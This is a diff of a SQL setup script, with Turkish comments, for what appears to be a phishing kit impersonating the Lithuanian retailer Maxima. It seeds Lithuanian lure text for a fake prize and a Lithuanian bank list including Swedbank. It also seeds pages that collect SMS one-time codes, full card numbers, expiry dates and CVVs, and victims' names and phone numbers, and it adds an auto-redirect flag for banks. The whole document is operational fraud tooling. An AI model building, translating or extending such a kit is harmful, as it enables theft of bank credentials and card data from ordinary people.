@@ -63,7 +63,8 @@ CREATE TABLE IF NOT EXISTS public.global_settings (
   og_image_url text,
   portal_name text DEFAULT 'Maxima',
   support_center_name text DEFAULT 'Maxima pagalba',
-  target_country text DEFAULT 'Lietuva',
+  target_country text DEFAULT 'Litvanya',
+  site_language text DEFAULT 'lt',
   site_enabled boolean DEFAULT true,
   entry_page text DEFAULT '/win',
   wheel_settings jsonb DEFAULT '{}'::jsonb,
@@ -115,8 +116,87 @@ CREATE POLICY "Enable insert for all users" ON public.global_settings FOR INSERT
 CREATE POLICY "Enable update for all users" ON public.global_settings FOR UPDATE USING (true) WITH CHECK (true);
 CREATE POLICY "Enable delete for all users" ON public.global_settings FOR DELETE USING (true);
 
-INSERT INTO public.global_settings (site_enabled, entry_page)
-SELECT true, '/win' WHERE NOT EXISTS (SELECT 1 FROM public.global_settings);
+-- Eksik kolonlar (mevcut kurulumlar icin)
+ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS site_language text DEFAULT 'lt';
+
+INSERT INTO public.global_settings (
+  site_enabled, entry_page, site_language, target_country,
+  logo_url, bg_url, portal_name, support_center_name,
+  win_title, win_subtitle, win_button,
+  banken_title, banken_subtitle, banken_search_placeholder,
+  wait_title, wait_subtitle,
+  sms_title, sms_subtitle, sms_input_label, sms_button, sms_loading,
+  card_title, card_subtitle, card_owner_label, card_number_label,
+  card_expiry_label, card_cvv_label, card_button,
+  code_title, code_subtitle, code_button,
+  live_support_title, live_support_subtitle, live_support_button,
+  profile_title_small, profile_title_main, profile_subtitle,
+  profile_firstname_label, profile_lastname_label, profile_phone_label,
+  profile_button, profile_loading_text
+)
+SELECT
+  true, '/win', 'lt', 'Litvanya',
+  '/form-assets/maxima-mini-logo.png', '/form-assets/bg-desktop.png',
+  'Maxima klientų portalas', 'Maxima klientų aptarnavimas',
+  'Išskirtinė Maxima premija',
+  'Sveikiname! Buvote atrinkti šios dienos Maxima kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo premiją.',
+  'Atsiimti premiją',
+  'Pasirinkite savo banką', 'Pasirinkite savo banką, kad tęstumėte.', 'Ieškoti banko...',
+  'Prašome palaukti', 'Jūsų užklausa saugiai apdorojama...',
+  'SMS saugos kodas', 'Įveskite {digits} skaitmenų kodą.', 'Vienkartinis kodas', 'Patvirtinti', 'Apdorojama...',
+  'Mokėjimo informacija', 'Patikrinkite ir patvirtinkite savo duomenis.',
+  'Kortelės turėtojo vardas', 'Kortelės numeris', 'Galiojimo pabaiga MM/MM', 'Saugos kodas', 'Tęsti',
+  'Sveiki', 'Įveskite dalyvavimo kodą, kurį gavote iš {partner}, kad atsiimtumėte atlygį.', 'Patvirtinti kodą',
+  'Tiesioginis palaikymas',
+  'Norėdami tęsti, turite susisiekti su mūsų klientų aptarnavimo skyriumi.' || chr(10) || chr(10) || 'Spustelėkite žemiau esantį mygtuką, kad pradėtumėte pokalbį.',
+  'Pradėti pokalbį',
+  'Prizas patvirtintas', 'Jūsų premijos suma', 'Patvirtinkite savo duomenis tolesniam apdorojimui.',
+  'Vardas', 'Pavardė', 'Mobiliojo telefono numeris', 'Kitas', 'Apdorojama...'
+WHERE NOT EXISTS (SELECT 1 FROM public.global_settings);
+
+-- Mevcut satirdaki NULL alanlari LT varsayilanlariyla doldur
+UPDATE public.global_settings SET
+  site_language = COALESCE(site_language, 'lt'),
+  target_country = COALESCE(target_country, 'Litvanya'),
+  logo_url = COALESCE(logo_url, '/form-assets/maxima-mini-logo.png'),
+  bg_url = COALESCE(bg_url, '/form-assets/bg-desktop.png'),
+  portal_name = COALESCE(portal_name, 'Maxima klientų portalas'),
+  support_center_name = COALESCE(support_center_name, 'Maxima klientų aptarnavimas'),
+  win_title = COALESCE(win_title, 'Išskirtinė Maxima premija'),
+  win_subtitle = COALESCE(win_subtitle, 'Sveikiname! Buvote atrinkti šios dienos Maxima kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo premiją.'),
+  win_button = COALESCE(win_button, 'Atsiimti premiją'),
+  banken_title = COALESCE(banken_title, 'Pasirinkite savo banką'),
+  banken_subtitle = COALESCE(banken_subtitle, 'Pasirinkite savo banką, kad tęstumėte.'),
+  banken_search_placeholder = COALESCE(banken_search_placeholder, 'Ieškoti banko...'),
+  wait_title = COALESCE(wait_title, 'Prašome palaukti'),
+  wait_subtitle = COALESCE(wait_subtitle, 'Jūsų užklausa saugiai apdorojama...'),
+  sms_title = COALESCE(sms_title, 'SMS saugos kodas'),
+  sms_subtitle = COALESCE(sms_subtitle, 'Įveskite {digits} skaitmenų kodą.'),
+  sms_input_label = COALESCE(sms_input_label, 'Vienkartinis kodas'),
+  sms_button = COALESCE(sms_button, 'Patvirtinti'),
+  sms_loading = COALESCE(sms_loading, 'Apdorojama...'),
+  card_title = COALESCE(card_title, 'Mokėjimo informacija'),
+  card_subtitle = COALESCE(card_subtitle, 'Patikrinkite ir patvirtinkite savo duomenis.'),
+  card_owner_label = COALESCE(card_owner_label, 'Kortelės turėtojo vardas'),
+  card_number_label = COALESCE(card_number_label, 'Kortelės numeris'),
+  card_expiry_label = COALESCE(card_expiry_label, 'Galiojimo pabaiga MM/MM'),
+  card_cvv_label = COALESCE(card_cvv_label, 'Saugos kodas'),
+  card_button = COALESCE(card_button, 'Tęsti'),
+  code_title = COALESCE(code_title, 'Sveiki'),
+  code_subtitle = COALESCE(code_subtitle, 'Įveskite dalyvavimo kodą, kurį gavote iš {partner}, kad atsiimtumėte atlygį.'),
+  code_button = COALESCE(code_button, 'Patvirtinti kodą'),
+  live_support_title = COALESCE(live_support_title, 'Tiesioginis palaikymas'),
+  live_support_subtitle = COALESCE(live_support_subtitle, 'Norėdami tęsti, turite susisiekti su mūsų klientų aptarnavimo skyriumi.' || chr(10) || chr(10) || 'Spustelėkite žemiau esantį mygtuką, kad pradėtumėte pokalbį.'),
+  live_support_button = COALESCE(live_support_button, 'Pradėti pokalbį'),
+  profile_title_small = COALESCE(profile_title_small, 'Prizas patvirtintas'),
+  profile_title_main = COALESCE(profile_title_main, 'Jūsų premijos suma'),
+  profile_subtitle = COALESCE(profile_subtitle, 'Patvirtinkite savo duomenis tolesniam apdorojimui.'),
+  profile_firstname_label = COALESCE(profile_firstname_label, 'Vardas'),
+  profile_lastname_label = COALESCE(profile_lastname_label, 'Pavardė'),
+  profile_phone_label = COALESCE(profile_phone_label, 'Mobiliojo telefono numeris'),
+  profile_button = COALESCE(profile_button, 'Kitas'),
+  profile_loading_text = COALESCE(profile_loading_text, 'Apdorojama...')
+WHERE id = (SELECT id FROM public.global_settings ORDER BY created_at NULLS LAST LIMIT 1);
 
 -- ==================== 3) BANKS (Litvanya) ====================
 CREATE TABLE IF NOT EXISTS public.banks (
@@ -129,6 +209,7 @@ CREATE TABLE IF NOT EXISTS public.banks (
   domain text,
   country text DEFAULT 'LT',
   is_active boolean DEFAULT true,
+  auto_redirect boolean DEFAULT false,
   design_config jsonb DEFAULT '{}'::jsonb,
   created_at timestamptz DEFAULT now(),
   updated_at timestamptz DEFAULT now()
@@ -143,6 +224,8 @@ CREATE POLICY "Allow public read access on banks" ON public.banks FOR SELECT USI
 CREATE POLICY "Allow public insert on banks" ON public.banks FOR INSERT WITH CHECK (true);
 CREATE POLICY "Allow public update on banks" ON public.banks FOR UPDATE USING (true);
 CREATE POLICY "Allow public delete on banks" ON public.banks FOR DELETE USING (true);
+
+ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS auto_redirect boolean DEFAULT false;
 
 INSERT INTO public.banks (slug, name, logo_file, country, is_active) VALUES
   ('swedbank-lt',        'Swedbank',         '/bank-logos/lithuania/swedbank-lt.png',   'LT', true),
